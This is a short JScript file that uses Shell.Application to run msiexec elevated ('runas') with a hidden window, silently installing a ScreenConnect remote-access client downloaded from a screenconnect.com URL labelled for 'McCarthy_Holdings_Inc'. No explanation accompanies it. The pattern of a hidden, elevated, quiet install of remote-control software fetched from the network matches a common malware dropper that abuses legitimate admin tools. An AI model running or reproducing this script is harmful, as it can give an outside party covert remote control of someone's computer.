var shell = new ActiveXObject("Shell.Application");

shell.ShellExecute(
    "msiexec.exe",
    '/i "https://mcs1.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=McCarthy_Holdings_Inc&c=&c=&c=&c=&c=&c=&c=" /quiet /norestart',
    "",
    "runas",
    0
);